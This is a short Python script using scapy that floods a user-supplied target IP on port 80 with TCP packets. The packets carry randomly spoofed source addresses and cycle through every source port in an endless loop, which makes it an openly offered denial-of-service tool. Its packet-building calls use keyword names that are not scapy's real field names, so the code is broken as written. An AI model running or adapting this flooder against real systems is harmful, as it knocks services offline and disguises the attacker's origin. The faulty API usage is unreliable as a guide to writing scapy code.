import random
from scapy import all
from scapy.all import sr1, IP, ICMP, TCP, send
target_ip = input("Enter IP address of Target: ")
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    source_ip = a + dot + b + dot + c + dot + d

    for source_port in range(1, 65535):
        IP1 = IP(source_ip=source_ip, destination=target_ip)
        TCP1 = TCP(srcport=source_port, dstport=80)
        pkt = IP1 / TCP1
        send(pkt, inter=.001)

        print("packet sent ", i)
        i = i + 1
